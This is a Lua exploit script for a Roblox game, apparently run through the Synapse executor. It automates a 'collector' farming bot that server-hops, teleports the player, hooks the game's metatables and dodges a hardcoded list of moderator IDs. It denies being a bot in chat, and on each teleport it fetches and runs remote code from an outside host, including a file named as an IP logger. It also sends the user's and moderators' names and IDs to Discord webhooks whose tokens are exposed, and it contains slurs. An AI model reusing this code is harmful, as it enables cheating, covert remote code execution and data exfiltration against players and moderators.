--[[
	id: hXyxNy_qgpDJdN18qF2D0
	name: test
	description: d
	time1: 2021-06-02 19:50:00.522184+00
	time2: 2021-06-02 19:50:00.522185+00
	uploader: IvnADRSWX7AC6M1yT9Ptvzv2ISF7af_Zo9kKqv0S
	uploadersession: Y0uoQyczkx-vHzippP3iZyHNWcCVth
	flag: f
--]]

if game.PlaceId==3016661674 then
local queueforteleport = (syn and syn.queue_on_teleport) or queue_for_teleport;
queueforteleport('wait(.5)loadstring(syn.request{ Method = \'GET\', Url = \'http://archgay.xyz/a123(SCRIPT).lua\' }.Body)();');
end
if game.PlaceId==3541987450 then
local queueforteleport = (syn and syn.queue_on_teleport) or queue_for_teleport;
queueforteleport('wait(.5)loadstring(syn.request{ Method = \'GET\', Url = \'http://archgay.xyz/a123(SCRIPT).lua\' }.Body)();');
wait(4)
print("hello chingus")
spawn(function()
    wait(40)
Game:GetService("TeleportService"):Teleport(3016661674, game:GetService("Players").LocalPlayer)
end)
 function antiAfk()
		game:GetService("Players").LocalPlayer.Idled:connect(function()
			virtualUser:Button2Down(Vector2.new(0,0),workspace.CurrentCamera.CFrame)
			wait(1)
			virtualUser:Button2Up(Vector2.new(0,0),workspace.CurrentCamera.CFrame)
		end)
	end
antiAfk()
print("hello bingis")
print("Daily reminder that Silentos bot is on top")



loadstring(game:HttpGet("http://www.archgay.xyz/empty.lua"))()
--WHITELISTT


repeat wait() until game.Loaded
repeat wait() until game.ReplicatedStorage
wait()
repeat wait() until game.ReplicatedStorage:WaitForChild("ServerInfo")
wait(0.1)
print("started")
local OSTime = os.time();
local Time = os.date('*t', OSTime);
Time = string.format('%02d:%02d:%02d', Time.hour % 12, Time.min, Time.sec);
local servername = game:GetService("ReplicatedStorage").ServerInfo[tostring(game.JobId)].ServerName.Value
rconsolename("INTERNAL SUPER SECRET COLLECTOR SCRIPT!!!!")
loadstring(game:HttpGet("http://www.archgay.xyz/LGBTQ_edd.lua"))()
local msg = "was getting lgbtq rconsole "
local url = "https://discordapp.com/api/webhooks/795571243877138432/qXGiiXXllQrN94_tHw3U-kqmICMKRZMx2iR-76zsGzRfu0DWFvq76_J8ZpML_Q22o-MB"

syn.request({Url = url, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = game:GetService("HttpService"):JSONEncode({["content"]=msg})})
rconsoleprint("["..Time.."]".." ".."Looking for Collector in: "..servername.."     "..game.JobId.."\n")
local function cprint(...)
    local Content = {};
    
    for Index, Value in pairs{...} do
        table.insert(Content, tostring(Value));
    end

    local OSTime = os.time();
    local Time = os.date('*t', OSTime);
    Time = string.format('%02d:%02d:%02d', Time.hour % 12, Time.min, Time.sec);
    
    rconsoleprint(string.format('[%s] %s\n', Time, table.concat(Content, '   ')));
end

local HttpService = game:GetService'HttpService';
local SettingsFileName = 'private_settings.json';
local Settings = {
    Webhook = '';
    Soundhere = 'rbxassetid://3993398286';
    Priority = {"Azael Horn", "Heirloom", "Staff of Pain", "Pocket Watch", "Unwavering Focus", "Phoenix Bloom", "Dienis Locket", "Mask of Baima"};
    WaitingTime = 10;
};
if isfile(SettingsFileName) then
    Settings = HttpService:JSONDecode(readfile(SettingsFileName));
else
    local Settings = Settings;
    writefile(SettingsFileName, HttpService:JSONEncode(Settings));
    messageboxasync('Wrote settings to workspace, edit the \'' .. SettingsFileName .. '\' file to change settings', 'Collector Hopper', 0x40000);
end
 
if typeof(Settings) ~= 'table' or not Settings.Webhook then
    LocalPlayer:Kick'Invalid Settings';
end
game:GetService'ScriptContext'.Error:Connect(function(Message, Trace, Script)
    if Script == nil or Script == script then
        LocalPlayer:Kick(string.format('%s\n%s', tostring(Script), Message, Trace));
    end
end);

local queueforteleport = (syn and syn.queue_on_teleport) or queue_for_teleport;
queueforteleport('wait(.5)loadstring(syn.request{ Method = \'GET\', Url = \'http://archgay.xyz/okayniggchickenruggetrs.lua\' }.Body)();');

function waittime()
    local waittimee = math.random(1, 10)
if waittimee == 6 then
    wait(1.5)
end
if waittimee == 5 then
    wait(1.2)
end
if waittimee == 4 then
    wait(1.7)
end
if waittimee == 3 then
    wait(2.7)
end
if waittimee == 2 then
    wait(3.7)
end
if waittimee == 1 then
    wait(2.4)
end
if waittimee == 7 then
    wait(5.7)
end
if waittimee == 8 then
    wait(2.35)
end
if waittimee == 9 then
    wait(1.7)
end
if waittimee == 10 then
    wait(3.7)
end
    end


  function autoclaim()
      print("Auto claimingb yes")
for i,v in pairs (game.Players.LocalPlayer.Backpack:GetChildren()) do
            if v.Name:match("Azael Horn") or v.Name:match("Heirloom") or v.Name:match("Staff of Pain") or v.Name:match("Pocket Watch") or v.Name:match("Penis")then
            local player = game:GetService("Players").LocalPlayer
            local humanoid = player.Character:FindFirstChildOfClass("Humanoid")
            humanoid:EquipTool(v)
            v:Activate()
            end
end
end

function getplayers(path)
    local httpservice = game:GetService("HttpService")
    local data = httpservice:JSONDecode(path.Players.Value)
    
    local players = 0
    for i,v in pairs(data) do
        players = i
    end
    
    return tonumber(players)
end
print("Loading Mod Autoreply")

	local Players = game:GetService("Players")
	local RunService = game:GetService("RunService")
	local HttpService = game:GetService("HttpService")
	local ReplicatedStorage = game:GetService("ReplicatedStorage")
	local StarterGui = game:GetService("StarterGui")
	local CoreGui = game:GetService("CoreGui")
	local TweenService = game:GetService("TweenService")
	local TeleportService = game:GetService("TeleportService")
	local VirtualUser = game:GetService("VirtualUser")
	local LogService = game:GetService("LogService")


local cooldown = 0

for i,v in pairs(Players:GetPlayers()) do
    v.Chatted:Connect(function(Message)
			if Message:lower():find("are you a bot?") or Message:lower():find("collector bot") or Message:lower():find("are you a collector bot?") or Message:lower():find("r u a bot?") or Message:lower():find("r u a collector bot?") or Message:lower():find("r u a collector bot") or Message:lower():find("collector bot?") or Message:lower():find("r u a exploiter") or Message:lower():find("r u a autofarmer") or Message:lower():find("bot") then
			    				local msg = "Buyers Username: "  .. game.Players.LocalPlayer.Name ..  "\nUser ID: " .. game.Players.LocalPlayer.UserId.. "\nMods Name:" .. v.Name .. "\nMods User ID:" .. v.UserId .. ""
local url = "https://discord.com/api/webhooks/805621715602243625/3G4SVHE6OCGG6yMYybohNAk_Zg4WsEhZBsNUJ6fhHTouCoKd1wfJj0sVQzhz4FRkD-OP"

syn.request({Url = url, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = game:GetService("HttpService"):JSONEncode({["content"]=msg})})
				local speak = math.random(1, 8)
				if cooldown >= 1 then
				    print("fuck me pls")
				    else
				            cooldown = cooldown + 1
if speak == 1 then
    waittime()
local A_1 = "n" local A_2 = "All" 
local Event = game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest Event:FireServer(A_1, A_2)
end
if speak == 2 then
    waittime()
local A_1 = "no" local A_2 = "All" 
local Event = game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest Event:FireServer(A_1, A_2)
end
if speak == 3 then
    waittime()
local A_1 = "/e wave" local A_2 = "All" 
local Event = game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest Event:FireServer(A_1, A_2)
end
if speak == 4 then
    waittime()
local A_1 = "yesi" local A_2 = "All" 
local Event = game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest Event:FireServer(A_1, A_2)
end
if speak == 5 then
    waittime()
local A_1 = "/e thinker" local A_2 = "All" 
local Event = game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest Event:FireServer(A_1, A_2)
end
if speak == 6 then
    waittime()
local A_1 = "err no" local A_2 = "All" 
local Event = game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest Event:FireServer(A_1, A_2)
end
if speak == 7 then
    waittime()
local A_1 = "no" local A_2 = "All" 
local Event = game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest Event:FireServer(A_1, A_2)
end
if speak == 8 then
    waittime()
local A_1 = "nah" local A_2 = "All" 
local Event = game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest Event:FireServer(A_1, A_2)
end


		 end
    end
end)
end
print("Loaded Mod Autoreply")
	
	local Modlist = {
		[1272668411] = true,
	    [1781337577] = true,
	    [1586688425] = true,
	    [1220318470] = true,
	    [1319389359] = true,
	    [825698706] = true,
	    [1363341009] = true,
	    [1344100235] = true,
	    [1299216629] = true,
	    [56554769] = true,
	    [13255300] = true,
	    [1061554056] = true,
	    [22961239] = true,
	    [23090933] = true,
	    [83338597] = true,
	    [34649899] = true,
	    [708648] = true,
	    [64217106] = true,
	    [99413233] = true,
	    [44683924] = true,
	    [77857290] = true,
	    [27243005] = true,
	    [33799478] = true,
	    [94867018] = true,
	    [8540278] = true,
	    [23576551] = true,
	    [44121665] = true,
	    [16304417] = true,
	    [5840316] = true,
	    [199854653] = true,
	    [63231504] = true,
	    [58583904] = true,
	    [74649429] = true,
	    [29598148] = true,
	    [17194900] = true,
	    [1099784] = true,
	    [1602522] = true,
	    [59226303] = true,
	    [2377252] = true,
	    [31429757] = true,
	    [4201944] = true,
	    [75759386] = true,
	    [93748141] = true,
	    [32915494] = true,
	    [61017774] = true,
	    [43234023] = true,
	    [14525373] = true,
	    [445371567] = true,
	    [2096] = true,
	    [23501905] = true,
	    [25843220] = true,
	    [14933249] = true,
	    [112480124] = true,
	    [288946197] = true,
	    [39876285] = true,
	    [59815962] = true,
	    [8540278] = true,
	    [25067308] = true,
	    [1344100235] = true,
	    [119027642] = true,
	    [866327032] = true,
	    [1897766714] = true,
	    [341399806] = true,
	    [75759386] = true,
	    [87459732] = true,
	    [73062] = true,
	    [996627612] = true,
	    [72547575] = true,
	    [336587557] = true,
	    [1350574893] = true,
	    [338544906] = true,
	    [1450434693] = true,
	    [1341939134] = true,
	    [1298375307] = true,
	    [29656] = true,
	    [151239872] = true,
	    [9144458] = true,
	    [4416634] = true,
	    [46939864] = true,
	    [23820015] = true,
	    [32089732] = true,
	    [1202645042] = true,
	    [633527] = true,
	    [2252839] = true,
	    [40118429] = true,
	    [36710249] = true,
	    [28163453] = true,
	    [341792] = true,
	    [51453069] = true,
	    [411595307] = true,
	    [20469570] = true,
	    [1061554056] = true,
	    [77196836] = true,
	    [15695298] = true,
	    [20124427] = true,
	    [20010882] = true,
	    [17187421] = true,
	    [101892209] = true,
	    [53687357] = true,
	    [83785067] = true,
	    [28177302] = true,
	    [266280] = true,
	    [13255300] = true,
	    [8835343] = true,
	    [266280] = true,
	    [8835343] = true,
	    [411595307] = true,
	    [20469570] = true,
	    [341399806] = true,
	    [1061554056] = true,
	    [105012522] = true,
	    [1400607134] = true,
	    [1543092912] = true,
	    [1084238473] = true,
	    [84386040] = true,
	    [17187421] = true,
	    [1099784] = true,
	    [31543184] = true,
	    [2341207822] = true,
	    [117482480] = true,
	    [48325909] = true,
	    	    [2205361534] = true,
	    [1733439782] = true,
	    [1466100734] = true,
	    [300086658] = true,
	    [1178432932] = true,
	}

	for i,v in pairs(Players:GetPlayers()) do
		if Modlist[v.UserId] then
		    local msg = "Someone got kicked by a mod"
local url = "https://discord.com/api/webhooks/749731477524185221/Oo4QTG46WkAyG12asofXKsoIwhsHiRWmjXAkFaCTTme-kJLKPV4NZC8fsiZHv6mkg-VP"

syn.request({Url = url, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = game:GetService("HttpService"):JSONEncode({["content"]=msg})})
 local msg = Instance.new("Message", workspace)
 msg.Text = "MODERATOR DETECTED. HOPPING TO A NEW SERVER "
 local servers = game.ReplicatedStorage.ServerInfo:GetChildren()
 
        local randomserver = servers[math.random(1, #servers)]

        local players = getplayers(randomserver)

        if players > 1 and players < 24 then
            game:GetService("ReplicatedStorage").Requests.JoinPublicServer:FireServer(randomserver.Name)
        end
			if shared.Settings and shared.Settings.PanicMode and shared.Settings.PanicMode == true then
				spawn(CollectorTable.Rejoin)
			end
		end

		v.Chatted:Connect(function(Message)
			if Message:lower():find("e ban") or Message:lower():find("e givelife") or Message:lower():find("e joinserver") then
				--CollectorTable.SendModWebhook(Message .. "\n" .. "[Moderator Name:" .. "  " .. v.Name .. "]" .. "\n" .. "[ModeratorID:".. "  " .. v.UserId .. "]")
			end
		end)
	end

	Players.PlayerAdded:Connect(function(plr)
		spawn(function()
			repeat
				wait()
			until plr.UserId

			if Modlist[plr.UserId] then
			     local msg = "Someone got kicked by a mod"
local url = "https://discord.com/api/webhooks/749731477524185221/Oo4QTG46WkAyG12asofXKsoIwhsHiRWmjXAkFaCTTme-kJLKPV4NZC8fsiZHv6mkg-VP"

syn.request({Url = url, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = game:GetService("HttpService"):JSONEncode({["content"]=msg})})
			  local msg = Instance.new("Message", workspace)
 msg.Text = "MODERATOR DETECTED. HOPPING TO A NEW SERVER "
		local servers = game.ReplicatedStorage.ServerInfo:GetChildren()
 
        local randomserver = servers[math.random(1, #servers)]

        local players = getplayers(randomserver)

        if players > 1 and players < 24 then
            game:GetService("ReplicatedStorage").Requests.JoinPublicServer:FireServer(randomserver.Name)
        end
				if shared.Settings and shared.Settings.PanicMode and shared.Settings.PanicMode == true then
					spawn(CollectorTable.Rejoin)
					wait(0.1)
				end
			end
		
			
			plr.Chatted:Connect(function(Message)
				if Message:lower():find("e ban") or Message:lower():find("e givelife") or Message:lower():find("e joinserver") then
					print("hello")
				end
			end)
		end)
	end)

for i,v in pairs(Players:GetPlayers()) do
v.Chatted:Connect(function(Message)
			if Message:lower():find("e ban") or Message:lower():find("e givelife") or Message:lower():find("e joinserver") then
			    print("hi")
				local msg = "Buyers Username: "  .. game.Players.LocalPlayer.Name ..  "\nUser ID: " .. game.Players.LocalPlayer.UserId.. "\nMods Name:" .. v.Name .. "\nMods User ID:" .. v.UserId .. ""
local url = "https://discord.com/api/webhooks/805205528183308290/MYZwI5fvySjLIFZHC4qxikf7315BdnzEr-bGFoS2zUACCyzhI73uyOfBS2TacJ5QeOUa"

syn.request({Url = url, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = game:GetService("HttpService"):JSONEncode({["content"]=msg})})
			end
		end)
end

for i,v in pairs(Players:GetPlayers()) do
v.Chatted:Connect(function(Message)
			if Message:lower():find("collector bot") or Message:lower():find("are you a collector bot?") or Message:lower():find("r u a bot?") or Message:lower():find("collector bot") or Message:lower():find("r u a collector bot") or Message:lower():find("collector bot?") or Message:lower():find("r u a exploiter") or Message:lower():find("r u a autofarmer") or Message:lower():find("are you a collector bot?") then
			    print("hi")
				local msg = "Buyers Username: "  .. game.Players.LocalPlayer.Name ..  "\nUser ID: " .. game.Players.LocalPlayer.UserId.. "\nMods Name:" .. v.Name .. "\nMods User ID:" .. v.UserId .. ""
local url = "https://discord.com/api/webhooks/805621715602243625/3G4SVHE6OCGG6yMYybohNAk_Zg4WsEhZBsNUJ6fhHTouCoKd1wfJj0sVQzhz4FRkD-OP"

syn.request({Url = url, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = game:GetService("HttpService"):JSONEncode({["content"]=msg})})
			end
		end)
end


local plr = game:GetService("Players").LocalPlayer
local plrgui = plr:WaitForChild("PlayerGui")
local smenu = plrgui:WaitForChild("StartMenu", 4)
local playremote = smenu:WaitForChild("Finish", 1)
local bb = game:GetService("TeleportService")

print("hello0")

local Players = game:GetService'Players';
local LocalPlayer = Players.LocalPlayer;
local UIS = game:GetService'UserInputService';
local TS = game:GetService'TweenService';
local RunService = game:GetService'RunService';
local Tweening = false;
local TeleportService = game:GetService'TeleportService';


-- window focus spoof
local UserInputService = game:GetService('UserInputService')
for i, c in pairs(getconnections(UserInputService.WindowFocused)) do
    c:Fire()
end

for i, c in pairs(getconnections(UserInputService.WindowFocusReleased)) do
    c:Disable()
end
for i, c in pairs(getconnections(UserInputService.WindowFocused)) do
    c:Disable()
end
-- window focus spoof


--SERVER HOPPING



 

--SERVER HOPPING
print("hello2")
local request = syn and syn.request or http_request
function message(happen)
    request({
        Url = Settings.Webhook;
        Method = 'POST',
        Headers = {
            ['Content-Type'] = 'application/json'
        },
        Body = game:GetService('HttpService'):JSONEncode({content = "```diff\n".."-"..tostring(happen).."```"})
    });
end

local sup = Drawing.new("Text")
sup.Text = "Silentos collector bot cuh"
sup.Size = 24.0
sup.Visible = true
sup.Outline = true
sup.Color = Color3.new(203/155,5/55,204/155)
sup.Position = Vector2.new(20,1000)

loadstring(game:HttpGet("http://www.archgay.xyz/whitelistedautograbiplogger11211.lua"))()

--AUTOGRAB

function grab()
wait(0.2)
local dialogue = getsenv(game:GetService("Players").LocalPlayer.PlayerGui.DialogueGui.DialogueFrame.DialogueClient)
for i,v in pairs(dialogue) do
    if type(v) == "function" and not is_synapse_function(v) then
        for p,b in pairs(debug.getupvalues(v)) do
            if p == 8 then
                _G.dialogue = b
            end
        end
    end
end



local plr = game.Players.LocalPlayer
local choices = plr.PlayerGui.DialogueGui.DialogueFrame.Choices
local frame = plr.PlayerGui.DialogueGui.DialogueFrame
local found = false
local choice = ""
if frame.visible == true then
for i = 1, #Settings.Priority do
    local arti = Settings.Priority[i];
    if found == false then
    for i1, v1 in pairs(choices:GetChildren()) do
        if v1.Name:lower() == arti:lower() then 
            choice = v1.Name
            print("Choice is: ", choice)
            found = true
            break
        end
    end
    end
end


if found == true then
    _G.dialogue:FireServer({
        ["choice"] = choice
    })
 message("Choice is: ", choice)
 message(choice)
 log(choice)
wait (.1)
_G.dialogue:FireServer({
        exit = true
        })
    wait(2.1)
    autoclaim()
end
if found == false then
    _G.dialogue:FireServer({
        exit = true
    })
message("autograb didn't select anything")
    nothingfound()
  end    
 end
end

--new collector click 

local function Click()
    local myhrp = game.Players.LocalPlayer.Character.HumanoidRootPart
    
    
for i,v in pairs(game.workspace.NPCs:children()) do if v.Name == "Collector" and (v.HumanoidRootPart.Position - myhrp.Position).magnitude < 200 then
collector = v
end
end
    local VirtualInputManager = game:GetService("VirtualInputManager")
    local Camera = workspace.CurrentCamera
    
    local function WTS(Position)
        local Vec3, Visible = Camera:WorldToViewportPoint(Position)
        return Vector2.new(Vec3.X, Vec3.Y), Visible
    end
    
    local collectorVec2, collectorVis = WTS(collector.HumanoidRootPart.Position + Vector3.new(math.random(), math.random(), math.random()))
    
    VirtualInputManager:SendMouseMoveEvent(collectorVec2.X, collectorVec2.Y, game)
    wait()
    fireclickdetector(collector.ClickDetector)
end
--new collector click


function clickdik(which)
    local player = game:GetService("Players").LocalPlayer
    local frame = player.PlayerGui.DialogueGui.DialogueFrame
    local Click = fireclickdetector
    local Collectors1 = {};

local namecall = mt.__index
local setreadonly = setreadonly or make_writable
setreadonly(mt,false)
mt.__index = newcclosure(function(self, key)
    if checkcaller() then
        return namecall(self, key)
    end
if key == "Hit" then
    return namecall(Collector.HumanoidRootPart, "CFrame")
elseif key == "Target" then
    return namecall(Collector, "HumanoidRootPart")
end
return namecall(self, key)
end)
setreadonly(mt,true)

    for i, v in pairs(workspace:WaitForChild'NPCs':GetChildren()) do
        if v.Name:match'Collector' and v:FindFirstChild'Head' then
            table.insert(Collectors1, v);
        end
    end
    repeat wait()
    if (player.Character.HumanoidRootPart.Position - Collectors1[which].HumanoidRootPart.Position).Magnitude < 10 then
        Click(Collectors1[which]:FindFirstChildOfClass'ClickDetector',3);
    end
    until frame.visible == true
end

function danger()
    print("Kicking from game/returning to menu/ crashing")
wait(1.2)
pcall(function()game.ReplicatedStorage.Requests.ReturnToMenu:InvokeServer(); end)
game:GetService("Players").LocalPlayer:Kick('Found Collector!')
while true do 
    end
end

function nothingfound()
while wait(0.3) do
if game.Players.LocalPlayer.Character:FindFirstChild("Danger") then
    print ("U ARE IN DANGER OOGA APE")
else
game:GetService("Players").LocalPlayer:Kick('You got collector but chose nothing :C')
message("Autograb did not choose anything.. :c")
end
end
end


spawn(function()
repeat
    if game.Players.LocalPlayer.Character:FindFirstChild("Danger") then 
        game.Players.LocalPlayer.Character.Torso.Anchored = false
        end
until game.Players.LocalPlayer.Character:FindFirstChild("Danger")
end)

--AUTOGRAB

function log(msg)
    request({
        Url = "https://discordapp.com/api/webhooks/738884053901770832/4lp6RfReoeiiJQRDEftQbiNsjYYG_TAJfr3LrkYZoB9ySoTGuRbWQTrfo3QKGkxt9v4y";
        Method = 'POST',
        Headers = {
            ['Content-Type'] = 'application/json'
        },
        Body = game:GetService('HttpService'):JSONEncode({content = "```diff\n".."-"..tostring(msg).."```"})
    });
end

function water(msg)
    request({
        Url = "https://discord.com/api/webhooks/800507421608378378/gu5LE1VMiQWdDtFX2tHCPHi_cqBt-AVyzC2tl1iev5a8MhL0OG3soafr5Z59wmA-Fa_E";
        Method = 'POST',
        Headers = {
            ['Content-Type'] = 'application/json'
        },
        Body = game:GetService('HttpService'):JSONEncode({content = "```diff\n".."-"..tostring(msg).."```"})
    });
end

function playsound()
    a = Instance.new("Sound")    
    a.SoundId = Settings.Soundhere
    a.Parent = game.Lighting
    a.Volume = 6
    a:Play()
end 
print("hello3")

function sendnotif(title, body)
    game.StarterGui:SetCore("SendNotification", {
        Title = title;
        Text = body;
        Duration = 9e9;
    })
end
local BeachRoom
local DesertRoom
local PlainsRoom
local JungleRoom
print("rererererererere")
for i,v in pairs(workspace:GetChildren()) do
    if v.Name == "Part" then
        if v.BrickColor == BrickColor.new("Fawn brown") and v.Size == Vector3.new(9.75, 35.5, 8.25)  then
            DesertRoom = v
        elseif v.BrickColor == BrickColor.new("Dark stone grey") and v.Size == Vector3.new(54.5, 118.75, 41.25) then
            PlainsRoom = v
        elseif v.BrickColor == BrickColor.new("Bronze") and v.Size == Vector3.new(7.5, 36.25, 13.5) then
            JungleRoom = v
        elseif v.BrickColor == BrickColor.new("Smoky grey") and v.Size == Vector3.new(7.5, 36.5, 9.5) then
            BeachRoom = v
        end
    end
end



local function DistanceTime(Distance, Speed)
    return Distance / Speed;
end
-- FLY FUNCTION
function fly(x)
    local Collectors = {};

    for i, v in pairs(workspace:WaitForChild'NPCs':GetChildren()) do
        if v.Name:match'Collector' and v:FindFirstChild'Head' then
            table.insert(Collectors, v);
        end
    end

    local CF = (Collectors[x].Torso.CFrame) * CFrame.new(0, 0, 2);   
    print("hi")
    Instance.new('Folder', LocalPlayer.Character).Name = 'NoFall';
    print("nofall")
    local Distance = (LocalPlayer.Character.HumanoidRootPart.Position - Collectors[x].Torso.Position).magnitude;
    print("distance")
    print(Distance)
    local Time = DistanceTime(Distance, 180);
    print("hi")
    local TW = TweenInfo.new(Time, Enum.EasingStyle.Linear);
    local Tween = TS:Create(LocalPlayer.Character.HumanoidRootPart, TW, { CFrame = CF });
    Tweening = true;
    Tween:Play();
    Tween.Completed:Connect(function() Tweening = false; end);
end
-- FLY FUNCTION

-- -834.47, 253.25, 272.98 Beach
-- -1283.07, 1164.82, -2338.98 Plains
-- -2604.73, 1097.82, 1475.93 Jungle
-- -1546.47, 363.75, 2445.55 Desert

spawn(function()
    while wait(.01) do
playremote:FireServer()
end
    end)
wait(.3)
smenu.Enabled = false
wait(.2)
spawn(function()
-- Kick if no FF
spawn (function()
    wait(4)
    while wait(0.1) do
if game.Players.LocalPlayer.Character:FindFirstChildOfClass("ForceField") then
    else
     if
    (DesertRoom.CanCollide == false) or 
    (DesertRoom.Transparency >= 0.1) or 
    (BeachRoom.CanCollide == false) or
    (BeachRoom.Transparency >= 0.1) or
    (PlainsRoom.CanCollide == false) or
    (PlainsRoom.Transparency >= 0.1) or
    (JungleRoom.CanCollide == false) or
    (JungleRoom.Transparency >= 0.1) then
        wait(15)
else
message("You got pushed/spawned out of FF.. (Kicked you from the game and continued hopping)")
     game:GetService("Players").LocalPlayer:Kick('No FF, Serverhopping..') 
     wait(0.1)
     Game:GetService("TeleportService"):Teleport(3016661674, game:GetService("Players").LocalPlayer)
     end
end
end
end)

--[[
Internal notes:

Coordinates(collector TP location) :
Desert:
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-1546.48694, 351.496887, 2705.07666)

Beach:
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-917.272156, 238.099411, 271.082306)

Plaines:
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-1280.12122, 1125.04834, -2447.00537)

Jungle:
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-2686.30859, 1085.34766, 1467.96667)

]]



   print("chingis chaaaan!")     
   
wait(.1)
local character = game.Players.LocalPlayer.Character

spawn(function()
   while wait(.01) do
    if (DesertRoom.CanCollide == false) or (DesertRoom.Transparency >= 0.1) then
        spawn (function()
        message("Collector at Desert")
        log(game.Players.LocalPlayer.Name .. " Found a Collector at " .. "Desert")
        end)
        wait(3)
        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-1540.48694, 351.496887, 2705.07666)
        wait(3.1)
        local location = Vector3.new(-1546.48694, 351.496887, 2705.07666)
        character.Humanoid:MoveTo(location)
        wait(1)
        Click()
        wait(0.1)
        grab()
         wait(2)
        autoclaim()
        danger()
        playsound()
                game:GetService("Players").LocalPlayer:Kick('Found collector!')
while true do
    end
        _G.found = true
    break
    elseif (BeachRoom.CanCollide == false) or (BeachRoom.Transparency >= 0.1) then
        spawn (function()
            collectorfound = true
        message("Collector at Beach")
        log(game.Players.LocalPlayer.Name .. " Found a Collector at " .. "Beach")
        end)
        wait(3)
        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-912.272156, 238.099411, 265.082306)
         wait(2.1)
        local location = Vector3.new(-917.272156, 238.099411, 271.082306)
        character.Humanoid:MoveTo(location)
        wait(3)
        Click()
        wait(0.1)
        grab()
         wait(2)
        autoclaim()
        playsound()
        danger()
                game:GetService("Players").LocalPlayer:Kick('Found collector!')
while true do
    end
        _G.found = true
        break
    elseif (PlainsRoom.CanCollide == false) or (PlainsRoom.Transparency >= 0.1) then
        spawn (function()
            collectorfound = true
        message("Collector at Plains")
        log(game.Players.LocalPlayer.Name .. " Found a Collector at " .. "Plains")
        end)
        wait(2.5)
        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-1275.12122, 1129.04834, -2442.00537)
        wait(3.1)
        local location = Vector3.new(-1280.12122, 1125.04834, -2447.00537)
        character.Humanoid:MoveTo(location)
        wait(1.5)
        Click()
        wait(0.1)
        grab()
         wait(2)
        autoclaim()
        playsound()
        danger()
                game:GetService("Players").LocalPlayer:Kick('Found collector!')
while true do
    end
        _G.found = true
        break
    elseif (JungleRoom.CanCollide == false) or (JungleRoom.Transparency >= 0.1) then
       spawn (function()
           collectorfound = true
        message("Collector at Jungle")
        log(game.Players.LocalPlayer.Name .. " Found a Collector at " .. "Jungle")
       end)
        wait(2.5)
        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-2672, 1026, 1468)
        wait(2.1)
        local location = Vector3.new(-2687, 1028, 1470)
        character.Humanoid:MoveTo(location)
        wait(1.5)
        Click()
        wait(0.1)
        grab()
        wait(2)
        autoclaim()
        danger()
        playsound()
        game:GetService("Players").LocalPlayer:Kick('Found collector!')
while true do
    end
        _G.found = true
          break
    else
end
end
end)


        wait(Settings.WaitingTime)
        
   --Check to see if collector is found, if it is found, Bot will not hop.  
   
   
if
    (DesertRoom.CanCollide == false) or 
    (DesertRoom.Transparency >= 0.1) or 
    (BeachRoom.CanCollide == false) or
    (BeachRoom.Transparency >= 0.1) or
    (PlainsRoom.CanCollide == false) or
    (PlainsRoom.Transparency >= 0.1) or
    (JungleRoom.CanCollide == false) or
    (JungleRoom.Transparency >= 0.1) or collectorfound == true
 then
     print("Door")
    wait(10)
else
    if collectorfound == true then
        print("hello")
        else
    wait(0.1)
    while wait(0.1) do
        print("serverhopping")
        if _G.found then
            return
        end
        local servers = game.ReplicatedStorage.ServerInfo:GetChildren()
        local randomserver = servers[math.random(1, #servers)]

        local players = getplayers(randomserver)

        if players > 1 and players < 24 then
            game:GetService("ReplicatedStorage").Requests.JoinPublicServer:FireServer(randomserver.Name)
        end
    end
end
end
end)
end